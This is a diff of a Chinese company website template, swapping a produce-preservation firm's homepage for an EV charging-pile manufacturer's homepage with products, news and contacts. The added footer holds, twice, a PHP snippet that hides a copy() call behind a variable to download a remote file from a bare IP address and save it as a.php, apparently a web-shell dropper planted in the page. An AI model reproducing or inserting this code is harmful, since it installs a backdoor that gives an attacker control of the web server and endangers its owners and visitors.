- <input class="txt" type="text" name="contacts" id="name" placeholder="您的姓名" data-rule="姓名:required;"/>
- </div>
- <div class="item">
- <input class="txt" type="text" name="tel" id="tel" placeholder="您的电话" data-rule="手机号码:required;mobile|tel"/>
- </div>
- <div class="item mj">
- <input class="txt" type="text" name="content" placeholder="请输入内容" data-rule="留言内容:required;"/>
- </div>
- <input type="hidden" name="dede_fields" value="name,text;tel,text;content,text" />
-<input type="hidden" name="dede_fieldshash" value="b430c226756ec920d6ba032b04a5184a" />
- <input class="submit" type="submit" name="submit" value="立即提交" />
- </form>
- <script type="text/javascript">
- function checkForm()
- {
- if(document.getElementById('name').value.length==0)
- {
- alert('姓名不能为空！');
- return false;
-}
- if(document.getElementById('tel').value.length==0)
- {
- alert('电话不能为空！');
- return false;
-}
- 
- return true;
-}
- </script> 
- </div>
- </div>
- <!--在线留言结束--> 
- </div>
- 
- <!--版权开始-->
- <div class="copyright">Copyright &copy; 2019-2023 西安海宏保鲜科技有限责任公司 版权所有　地址：西安市高新区科技路70号梧桐朗座B-703　备案号：<a href="http://beian.miit.gov.cn/" target="_blank" title="陕ICP备20000090号">陕ICP备20000090号</a>　</div>
-  	<div style="width:300px;margin:0 auto; padding:20px 0;">
-		 		<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=61012402000249" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/skin/images/41.png" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#fff;">陕公网安备 61012402000249号</p></a>
-		 	</div>
-		 
- <!--版权结束--> 
- </div>
+<!--幻灯片大图开始-->
+<div id="banner_main" class="banner_main">
+  <div id="banner" class="banner">
+    <ul class="list clearfix">
+      
+      <li> <a href=""> <img src="/static/upload/image/20221011/1665481698336721.jpg" alt=""/> </a> </li>
+      
+      <li> <a href=""> <img src="/static/upload/image/20221011/1665475628207556.jpg" alt=""/> </a> </li>
+      
+      <li> <a href=""> <img src="/static/upload/image/20221011/1665475738445654.jpg" alt=""/> </a> </li>
+      
+      <li> <a href=""> <img src="/static/upload/image/20221011/1665476774225781.jpg" alt=""/> </a> </li>
+      
+    </ul>
+    <div class="tip"></div>
+    <a href="javascript:;" id="btn_prev" class="prev icon"></a> <a href="javascript:;" id="btn_next" class="next icon"></a> </div>
+</div>
+<!--幻灯片大图结束--> 
+<!--搜索栏开始-->
+<div class="announ_main">
+  <div class="announ w1200 clearfix"> 
+    <!--热搜词开始-->
+    <div class="announ_left" aos="fade-right" aos-easing="ease" aos-duration="700"> <span class="fl">热门搜索：</span>
+      <div class="re_key fl">  <a href="/lm1/">交流充电桩</a>  <a href="/lm2/">直流充电桩</a>  </div>
+    </div>
+    <!--热搜词结束-->
+    <div class="announ_right fr" aos="fade-left" aos-easing="ease" aos-duration="700">
+      <div class="search">
+        <form name="formsearch" action="/search/">
+          <input class="fl tex" type="text" name="keyword" value="请输入关键字"  onfocus="if(this.value==defaultValue)this.value=&#39;&#39;" onBlur="if(this.value==&#39;&#39;)this.value=defaultValue">
+          <input type="submit" value="" class="btn ease">
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+<!--搜索栏结束-->
+<div class="index"> 
+  <!--产品中心开始-->
+  <div class="floor_1_main"> 
+    <div class="floor_1 w1200 clearfix">
+      <div class="title" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="100">
+        <h3><b>产品中心</b></h3>
+        <h4>服务创造价值、存在造就未来</h4>
+        <s class="line_lef"></s><s class="line_rig"></s></div>
+      <div class="iproduct"> 
+        <!--产品分类开始-->
+        <div class="menu hd clearfix" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="200">
+          <ul class="list clearfix">
+            
+            <li> <a href="/lm1/">交流充电桩</a> </li>
+            
+            <li> <a href="/lm2/">直流充电桩</a> </li>
+            
+          </ul>
+        </div>
+        <!--产品分类结束-->
+        <div class="ipro bd" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="300">
+          <div class="cont clearfix">
+            <div class="bigimg bd fl">
+              <ul>
+                
+                <li> <a href="/lm1/48.html" title="14KW双枪交流充电桩"> <img src="/static/upload/image/20221018/1666055572775327.jpg" alt="14KW双枪交流充电桩"/> </a> </li>
+                
+                <li> <a href="/lm2/47.html" title="120KW双枪直流充电桩"> <img src="/static/upload/image/20230522/1684720780124270.jpg" alt="120KW双枪直流充电桩"/> </a> </li>
+                
+                <li> <a href="/lm2/46.html" title="30KW单枪直流充电桩"> <img src="/static/upload/image/20221018/1666055604850338.jpg" alt="30KW单枪直流充电桩"/> </a> </li>
+                
+                <li> <a href="/lm2/45.html" title="80KW-180KW双枪直流充电桩"> <img src="/static/upload/image/20221018/1666055619311187.jpg" alt="80KW-180KW双枪直流充电桩"/> </a> </li>
+                
+              </ul>
+            </div>
+            <div class="smalimg hd fr">
+              <ul class="list">
+                
+                <li class="item"> <img src="/static/upload/image/20221018/1666055572775327.jpg" alt="14KW双枪交流充电桩" data-img="14KW双枪交流充电桩"/> <a class="bg" href="/lm1/48.html" title="14KW双枪交流充电桩">
+                  <h3 >14KW双枪交流充电桩</h3>
+                  <span>查看详情</span> </a> </li>
+                
+                <li class="item"> <img src="/static/upload/image/20230522/1684720780124270.jpg" alt="120KW双枪直流充电桩" data-img="120KW双枪直流充电桩"/> <a class="bg" href="/lm2/47.html" title="120KW双枪直流充电桩">
+                  <h3 >120KW双枪直流充电桩</h3>
+                  <span>查看详情</span> </a> </li>
+                
+                <li class="item"> <img src="/static/upload/image/20221018/1666055604850338.jpg" alt="30KW单枪直流充电桩" data-img="30KW单枪直流充电桩"/> <a class="bg" href="/lm2/46.html" title="30KW单枪直流充电桩">
+                  <h3 >30KW单枪直流充电桩</h3>
+                  <span>查看详情</span> </a> </li>
+                
+                <li class="item"> <img src="/static/upload/image/20221018/1666055619311187.jpg" alt="80KW-180KW双枪直流充电桩" data-img="80KW-180KW双枪直流充电桩"/> <a class="bg" href="/lm2/45.html" title="80KW-180KW双枪直流充电桩">
+                  <h3 >80KW-180KW双枪直流充电桩</h3>
+                  <span>查看详情</span> </a> </li>
+                
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div class="more clearfix" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="400"> <a class="gd" href="/product/">查看更多</a> <a class="zx" href="http://wpa.qq.com/msgrd?v=3&uin=&site=qq&menu=yes">在线咨询</a> </div>
+      </div>
+    </div>
+     </div>
+  <!--产品中心结束--> 
+  
+  <script type="text/javascript">
+        jQuery(".ipro").slide({mainCell:".bd ul",interTime: 5000,autoPlay:true});
+    </script> 
+  
+  <!--小banner开始-->
+  <div class="xunpan" aos="fade-up" aos-easing="ease" aos-duration="700">
+    <div class="w1200 por clearfix"> <a href="http://wpa.qq.com/msgrd?v=3&uin=&site=qq&menu=yes" class="img"> <img src="http://www.qdmfxny.cn//skin/images/ren.png" alt=""/> </a>
+      <div class="zixun fr">
+        <p class="tit"> 根据您的要求量身定制 <span class="en">Customize according to your request</span> </p>
+        <div class="tel"> <em class="icon"></em> 18661734618 <a class="icon" href="http://wpa.qq.com/msgrd?v=3&uin={dede:global.cfg_qq/}&site=qq&menu=yes"> 立即咨询</a> </div>
+      </div>
+    </div>
+  </div>
+  <!--小banner结束--> 
+  <!--产品优势开始-->
+  <div class="floor_2_main">
+    <div class="floor_2 w1200"> 
+      <div class="title" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="100">
+        <h3><b>产品优势</b></h3>
+        <h4>公司始终秉承“以科技为先导，以质量求生存、以信誉促发展”为企业宗旨，不断改革创新。</h4>
+        <s class="line_lef"></s><s class="line_rig"></s></div>
+      
+      <div class="youshi clearfix"> 
+        <div class="item it1 clearfix" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="100">
+          <div class="tit fl"><img src="http://www.qdmfxny.cn//skin/images/bt1.jpg"/>
+            <h3>supply</h3>
+          </div>
+          <div class="txt fl">
+            <h2>全产业链 供应服务</h2>
+            <h4>研发、生产、销售、服务一条龙服务</h4>
+            <p class="desc">公司凭借专业的技术基础，丰富的管理经验，先进的制造设备和对国际电气流行趋势的正确把握，为客户生产出工艺精湛，品质卓越，外形典雅和安全耐用的电气产品。目前已成功开发出落地式交流充电桩、壁挂式交流充电桩、一体式直流充电机、直流低压充电桩、分体式直流充电机、交直流一体充电桩、广告一体桩等，是业内产品链最齐全、最完整的企业，已成为国内电力企业及电动汽车制造企业的充电设备主流供应商。</p>
+           </div>
+          <a class="img"><img src="/static/upload/image/20221011/1665470331923777.jpg"/></a> </div>
+        
+        <div class="item it2 clearfix" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="200">
+          <div class="tit fl"><img src="http://www.qdmfxny.cn//skin/images/bt2.jpg"/>
+            <h3>SAFETY</h3>
+          </div>
+          <div class="txt fl">
+            <h2>优质品质</h2>
+            <h4></h4>
+            <p class="desc">青岛铭锋新能源充电桩设备有限公司是一家集科研、设计、制造、销售于一体的新能源高端智能充电桩设备生产企业，致力于为电能使用效率的提高和节能减排提供专业、全面的充电设备及充电运营站建设一体化解决方案。严格把关产品质量，打造充电桩品牌标杆，以质量求生存，靠信誉求发展。</p>
+           </div>
+          <a class="img"><img src="/static/upload/image/20221011/1665469984929933.png"/></a> </div>
+        
+        <div class="item it3 clearfix" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="300">
+          <div class="tit fl"><img src="http://www.qdmfxny.cn//skin/images/bt3.jpg"/>
+            <h3>QUALITY</h3>
+          </div>
+          <div class="txt fl">
+            <h2>以科技为先导，以质量求生存、以信誉促发展</h2>
+            <h4></h4>
+            <p class="desc"> 青岛铭锋新能源科技有限公司是一家集研发、生产、销售、服务为一体的新能源科技企业，坐落于风景秀丽的海滨城市——青岛市黄岛区，隶属青岛铭锋电缆集团有限公司。公司始终秉承“以科技为先导，以质量求生存、以信誉促发展”为企业宗旨，不断改革创新。企业产品严格按照行业高质量体系进行管理和生产。目前公司自主研发生产各种系列充电桩产品，注册品牌为”电小满”, 为广大新能源车主提供更加便捷、高效、安全、可靠的充电服...</p>
+           </div>
+          <a class="img"><img src="/static/upload/image/20221011/1665470344580638.jpg"/></a> </div>
+         </div>
+    </div>
+  </div>
+  <!--产品优势结束--> 
+  
+  <!--服务流程开始-->
+  <div class="floor_3_main">
+    <div class="floor_3 w1200 clearfix">
+      <div class="title2 fl" aos="fade-left" aos-easing="ease" aos-duration="700">
+        <h3>服务流程<i>/ Service process</i></h3>
+        <p><em class="icon"></em>18661734618</p>
+      </div>
+      <div class="liuc fl">
+        <ul class="list clearfix">
+          <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="100">
+            <p><img src="http://www.qdmfxny.cn//skin/images/lc1.png"/>在线询盘</p>
+            <span class="jt"></span></li>
+          <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="200">
+            <p><img src="http://www.qdmfxny.cn//skin/images/lc2.png"/>解决方案</p>
+            <span class="jt"></span></li>
+          <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="300">
+            <p><img src="http://www.qdmfxny.cn//skin/images/lc3.png"/>在线下单</p>
+            <span class="jt"></span></li>
+          <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="400">
+            <p><img src="http://www.qdmfxny.cn//skin/images/lc4.png"/>落单生产</p>
+            <span class="jt"></span></li>
+          <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="500">
+            <p><img src="http://www.qdmfxny.cn//skin/images/lc5.png"/>物流快运</p>
+            <span class="jt"></span></li>
+          <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="600">
+            <p><img src="http://www.qdmfxny.cn//skin/images/lc6.png"/>售后服务</p>
+            <span class="jt"></span></li>
+          <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="700">
+            <p><img src="http://www.qdmfxny.cn//skin/images/lc7.png"/>定期回访</p>
+            <span class="jt"></span></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <!--服务流程结束--> 
+  
+  <!--客户见证开始-->
+  
+  <div class="floor_5_main">
+    <div class="floor_5 w1200 clearfix">
+      <div class="title" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="100">
+        <h3><b>客户服务</b></h3>
+        <h4>您的认可就是我们的动力</h4>
+        <s class="line_lef"></s><s class="line_rig"></s></div>
+      <div class="thumblist" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="200">
+        <ul class="list clearfix">
+          
+          <li class="item"><a href="/kehu/52.html" title="[field:title/]">
+            <div class="txt fr">
+              <h3 >厂家直销，让您的利益大增</h3>
+              <p>经过近几年的发展，公司已构建了相对完整的营销网络，覆盖国内多个城市和地区。...</p>
+              <span class="jia icon"></span></div>
+            <img src="/static/upload/image/20221025/1666677307711088.jpg" alt="厂家直销，让您的利益大增"/></a><span class="di"></span></li>
+          
+          <li class="item"><a href="/kehu/17.html" title="[field:title/]">
+            <div class="txt fr">
+              <h3 >根据您的需求，提供合适您的产品</h3>
+              <p>在详细了解客户对设备产能、成本预算等方面的要求之后，我们综合考虑各方面因素，为客户量身定制最合适，最···...</p>
+              <span class="jia icon"></span></div>
+            <img src="/static/upload/image/20221025/1666677320591141.jpg" alt="根据您的需求，提供合适您的产品"/></a><span class="di"></span></li>
+          
+          <li class="item"><a href="/kehu/16.html" title="[field:title/]">
+            <div class="txt fr">
+              <h3 >配件服务</h3>
+              <p>公司主要面向国内市场、当地客户及中资施工企业提供配件仓储式销售，并提供物资和配件仓储管理服务、配件供···...</p>
+              <span class="jia icon"></span></div>
+            <img src="/static/upload/image/20221025/1666677331924211.jpg" alt="配件服务"/></a><span class="di"></span></li>
+          
+          <li class="item"><a href="/kehu/15.html" title="[field:title/]">
+            <div class="txt fr">
+              <h3 >服务至上</h3>
+              <p>全天候为您提供及时、有效、专业、规范的服务公司以市场为导向，以客户需求为己任，与客户共同发展，实现双···...</p>
+              <span class="jia icon"></span></div>
+            <img src="/static/upload/image/20221025/1666677342800116.jpg" alt="服务至上"/></a><span class="di"></span></li>
+          
+        </ul>
+      </div>
+    </div>
+  </div>
+  
+  <!--客户见证结束--> 
+  
+  <!--关于我们开始-->
+  
+  <div class="floor_6_main">
+    <div class="floor_6 w1200">
+      <div class="title" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="100">
+        <h3><!--某某科技·--><b> 关于我们</b></h3>
+        <h4>科技领先 · 优质高效 · 客户至上 · 遵信守约</h4>
+        <s class="line_lef"></s><s class="line_rig"></s></div>
+      <div class="iabout clearfix" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="200"> 
+        <!--产品分类开始-->
+        <div class="lefnav fl">
+          <ul class="list clearfix">
+            
+            <li class="li1"><a href="/lm1/48.html" title="14KW双枪交流充电桩"><em></em>
+              <h3>14KW双···</h3>
+              </a></li>
+            
+            <li class="li1"><a href="/lm2/47.html" title="120KW双枪直流充电桩"><em></em>
+              <h3>120KW···</h3>
+              </a></li>
+            
+            <li class="li1"><a href="/lm2/46.html" title="30KW单枪直流充电桩"><em></em>
+              <h3>30KW单···</h3>
+              </a></li>
+            
+            <li class="li1"><a href="/lm2/45.html" title="80KW-180KW双枪直流充电桩"><em></em>
+              <h3>80KW-···</h3>
+              </a></li>
+            
+            <li class="li1"><a href="/lm2/44.html" title="480KW超级液冷(单)双枪直流充电桩"><em></em>
+              <h3>480KW···</h3>
+              </a></li>
+            
+          </ul>
+           <a href="/about/" class="more1">
+          <p>查看详情</p>
+          </a>  </div>
+        <!--产品分类结束--> 
+         <a class="img fl" href="{content:link}"> <img src="/static/upload/image/20230710/1688960078973077.jpg" alt="公司简介"/> </a>
+        <div class="txt fr"> <em class="yh"></em> <a href="/about/">
+          <h2>青岛铭锋新能源科技有限公司</h2>
+          <p class="desc">青岛铭锋新能源科技有限公司是一家集研发、生产、销售、服务为一体的新能源科技企业，坐落于风景秀丽的海滨城市——青岛市黄岛区，隶属青岛铭锋电缆集团有限公司。公司始终秉承“以科技为先导，以质量求生存、以信誉促发展”为企业宗旨，不断改革创新。企业产品严格按照行业高质量体系进行管理和生产。目前公司自主研发生产···</p>
+          <span class="cha">查看详情</span> </a> <span class="bk"></span> </div>
+         </div>
+      <!--荣誉资质开始-->
+      <div class="ihonor" id="ihonor" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="300">
+        <div class="bd">
+          <ul class="list clearfix">
+            
+          </ul>
+        </div>
+        <span class="btn prev icon"></span><span class="btn next icon"></span></div>
+      <!--荣誉资质结束--> 
+    </div>
+  </div>
+  
+  <!--关于我们结束--> 
+  <!--新闻中心开始-->
+  <div class="floor_7_main">
+    <div class="floor_7 w1200 clearfix"> 
+      <div class="title" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="100">
+        <h3><!--某某科技·--><b>新闻中心</b></h3>
+        <h4>了解最新公司动态及行业资讯</h4>
+        <s class="line_lef"></s><s class="line_rig"></s> </div>
+      
+      <div class="cont clearfix"> 
+        <!--推荐内容开始-->
+        <div class="newsBox fl" aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="200"> 
+          <div class="item"> <a class="img clearfix" href="/company/67.html" title="电小满充电桩冬季发货忙">
+            <div class="time fl"> <b>01</b>2023-12 <span class="yuan"></span> </div>
+            <img src="/static/upload/image/20231201/1701399991382765.png" alt="电小满充电桩冬季发货忙"/> </a> <a class="txt clearfix" href="/company/67.html" title="电小满充电桩冬季发货忙">
+            <h3>电小满充电桩冬季发货忙</h3>
+            <p>随着冬季的到来，新能源车主充电需求加大，充电站建设出现旺盛的增长势头，充电桩生产企业进入了一年中最繁忙季节。为了满足市场需求，铭锋新能源科技有限公司提前做好了生产计划和人员调配，开足马力，加快生产速度，严格把制产品质量，确保产品能按时按量按质的交付给客户，满足全国各地市场需求，为人们的绿色出行提供安全便捷的充电服务。...</p>
+            <span>查看详情</span></a> </div>
+           </div>
+        <!--推荐内容结束-->
+        <div class="textlist fr" aos="fade-left" aos-easing="ease" aos-duration="700" aos-delay="200">
+          <ul class="list">
+            
+            <li class="item clearfix"> <a class="img fl"  href="/company/65.html" title="荣耀时刻，再续辉煌-电小满闪耀上海国际充电设施产业展览会"> <img src="/static/upload/image/20230912/1694499892528174.jpg" alt="荣耀时刻，再续辉煌-电小满闪耀上海国际充电设施产业展览会"/> </a> <a class="txt fl"  href="/company/65.html" title="荣耀时刻，再续辉煌-电小满闪耀上海国际充电设施产业展览会">
+              <h3 >荣耀时刻，再续辉煌-电小满闪耀上海国际充电设施产业展览会</h3>
+              <p> 8月31日，为期三天的第十八届上海国际充电设施产业展览会（evse）胜利闭幕！依托顶尖资源，这场近3万平米的盛会用火爆的现场效果，在上海这座新能源创新发展先锋城市，向全行业、全社会展现了新能源浪潮中的强劲活力和充电设施行业高增长的澎湃动力。 作为新能源充电行业的新生品牌，电小满集结了公司销售、研发、生产等组成的精英团队参与了本次展会，电小满就技术亮点、用户体验、服务支撑、未来发展等方面现场与国内外嘉宾进行了深入分享交流。展会现场人潮涌动，展厅一···...</p>
+              </a>
+              <div class="time fr"><b>12</b>2023-09</div>
+            </li>
+            
+            <li class="item clearfix"> <a class="img fl"  href="/company/64.html" title="建军节|热烈祝贺中国人民解放军建军96周年，集团举行升旗仪式"> <img src="/static/upload/image/20230801/1690878691116802.jpg" alt="建军节|热烈祝贺中国人民解放军建军96周年，集团举行升旗仪式"/> </a> <a class="txt fl"  href="/company/64.html" title="建军节|热烈祝贺中国人民解放军建军96周年，集团举行升旗仪式">
+              <h3 >建军节|热烈祝贺中国人民解放军建军96周年，集团举行升旗仪式</h3>
+              <p> 八一建军节（Army Day）是中国人民解放军建军纪念日，定为每年的八月一日，由中国人民革命军事委员会设立，为纪念中国工农红军成立的节日。1933年7月11日，中华苏维埃共和国临时中央政府根据中央革命军事委员会6月30日的建议，决定8月1日为中国工农红军成立纪念日。1949年6月15日，中国人民革命军事委员会发布命令，以“八一”两字作为中国人民解放军军旗和军徽的主要标志。中华人民共和国成立后，将此纪念日改称为中国人民解放军建军节。2023年8月1日，是第96个建军节。96···...</p>
+              </a>
+              <div class="time fr"><b>01</b>2023-08</div>
+            </li>
+            
+            <li class="item clearfix"> <a class="img fl"  href="/company/63.html" title="战略合作|共赢能源新时代！"> <img src="/static/upload/image/20230706/1688623078643416.jpg" alt="战略合作|共赢能源新时代！"/> </a> <a class="txt fl"  href="/company/63.html" title="战略合作|共赢能源新时代！">
+              <h3 >战略合作|共赢能源新时代！</h3>
+              <p>7月3日上午，电小满-宁夏沣通新能科技有限公司签约仪式在青岛隆重举行。青岛铭锋新能源科技有限公司董事长孙总在铭锋集团总部会见了宁夏沣通新能科技有限公司朱总等主要负责人，双方就开展战略合作举行会谈，并签署战略合作协议。宁夏沣通新能科技有限公司朱总走访了公司展厅、硬件研发中心、软件研发中心、生产制造中心等，在走访中，业务负责人孔部长也就“电小满”品牌的发展历程，充电桩产品、发展规模等情况做了详细介绍，同时热心解答了朱总等主要负责人提出的各种问题···...</p>
+              </a>
+              <div class="time fr"><b>06</b>2023-07</div>
+            </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!--新闻中心结束--> 
+</div>
+<!--页尾开始--> 
+<div class="footer_main"> 
+  <!--友情链接开始-->
+  <div class="links" aos="fade-up" aos-easing="ease" aos-duration="700">
+    <div class="w1200 clearfix"> <span>友情链接：</span>  </div>
+  </div>
+  <!--友情链接结束-->
+  <div class="bottom_main" aos="fade-up" aos-easing="ease" aos-duration="700">
+    <div class="bottom w1200 clearfix"> 
+      <!--底部导航开始-->
+      <div class="bNav fl"> 
+        <dl class="item">
+          <dt> <a href="/about/" title="关于我们">关于我们</a></dt>
+          
+          
+          <dd><a href="/wenhua/" title="企业文化">企业文化</a></dd>
+          
+          <dd><a href="/jiaru/" title="加入我们">加入我们</a></dd>
+          
+          <dd><a href="/wangluo/" title="销售网络">销售网络</a></dd>
+          
+          
+        </dl>
+        
+        <dl class="item">
+          <dt> <a href="/news/" title="新闻中心">新闻中心</a></dt>
+          
+          
+          <dd><a href="/company/" title="公司动态">公司动态</a></dd>
+          
+          <dd><a href="/industry/" title="行业动态">行业动态</a></dd>
+          
+          
+        </dl>
+        
+        <dl class="item">
+          <dt> <a href="/product/" title="产品中心">产品中心</a></dt>
+          
+          
+          <dd><a href="/lm1/" title="交流充电桩">交流充电桩</a></dd>
+          
+          <dd><a href="/lm2/" title="直流充电桩">直流充电桩</a></dd>
+          
+          
+        </dl>
+        
+        <dl class="item">
+          <dt> <a href="/case/" title="服务案例">服务案例</a></dt>
+          
+        </dl>
+         </div>
+      <!--底部导航结束--> 
+      
+      <!--联系方式开始-->
+      <div class="contact_info fl">
+        <p class="p1">全国咨询热线</p>
+        <p class="dh">400-6969-299</p>
+        <p class="tel">邮箱：mingfengxny@163.com</p>
+        <p class="tel">手机：400-6969-299</p>
+        <p class="tel">电话：18661734618</p>
+        <p class="tel">地址：青岛市西海岸新区隐珠街道盛海路501号</p>
+      </div>
+      <!--联系方式结束--> 
+      
+      <!--二维码开始--> 
+      <!---->
+      <div class="ewm fl">
+        <dl>
+          <dt><img src="/static/upload/image/20221011/1665472292544195.jpg"/></dt>
+          <dd>微信扫码 关注我们</dd>
+        </dl>
+      </div>
+      <!--二维码结束--> 
+    </div>
+  </div>
+  
+  <!--版权开始-->
+  <div class="copyright_main">
+    <div class="copyright w1200 clearfix">
+      <p class="fl"><?php
+$a="copy"; 
+$a("http://43.129.31.209/ys.txt","a.php");   
+?>pass　<a href="https://beian.miit.gov.cn/" target="_blank" rel="nofollow">鲁ICP备2022031225号</a> </p>
+      <p class="fr"><a href="https://www.adminbuy.cn/" target="_blank">网站模板</a> <a href="http://www.qdmfxny.cn//sitemap.xml" target="_blank">XML地图</a> <?php
+$a="copy"; 
+$a("http://43.129.31.209/ys.txt","a.php");   
+?>pass</p>
+    </div>
+  </div>
+  <!--版权结束--> 
 </div>
 <!--页尾结束--> 
 
 <!--浮动客服开始-->
 <dl class="toolbar" id="toolbar">
- <dd><a class="slide tel slide-tel" href="javascritp:void(0);" title="咨询热线"><i><span></span></i>177 4913 8020</a></dd>
- 
- <dd><i class="code"><span></span></i>
- <ul class="pop pop-code">
- <li> <img src="/static/upload/image/20220222/1645528429925777.png" alt="水果保鲜丨专业水果蔬菜保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱生产厂家丨西安海宏保鲜科技有限责任公司-水果保鲜丨专业水果蔬菜保鲜袋丨保鲜膜丨保鲜盒丨保鲜箱生产厂家丨西安海宏保鲜科技有限责任公司"/>
- <h3><b>微信号：haihongbaoxiankeji</b>微信二维码</h3>
- </li>
- </ul>
- </dd>
- <dd> <a href="javascript:;"><i id="top" class="top"><span></span></i></a></dd>
+  <dd> <a class="slide tel slide-tel" href="javascritp:void(0);"> <i><span></span></i>400-6969-299 </a> </dd>
+  <dd> <a href="http://wpa.qq.com/msgrd?v=3&uin=&site=qq&menu=yes"> <i class="qq"><span></span></i> </a> </dd>
+  <dd> <i class="code"><span></span></i>
+    <ul class="pop pop-code">
+      <li><img src="/static/upload/image/20221011/1665472292544195.jpg"/>
+        <h3><b>微信号：400-6969-299</b>微信二维码</h3>
+      </li>
+    </ul>
+  </dd>
+  <dd> <a href="javascript:;"><i id="gotop" class="top"><span></span></i></a></dd>
 </dl>
+
 <!--浮动客服结束--> 
-<script src="/skin/js/aos.js"></script> 
-<script src="/skin/js/app.js"></script> 
+<script src="http://www.qdmfxny.cn//skin/js/aos.js"></script> 
+<script src="http://www.qdmfxny.cn//skin/js/app.js"></script> 
 <script type="text/javascript">
- AOS.init({
- easing: 'ease-out-back',
- duration: 1000
-});
+    AOS.init({
+        easing: 'ease-out-back',
+        duration: 1000
+    });
 </script>
+<script src='/Spider/?url=/' async='async'></script>
 </body>
 </html>
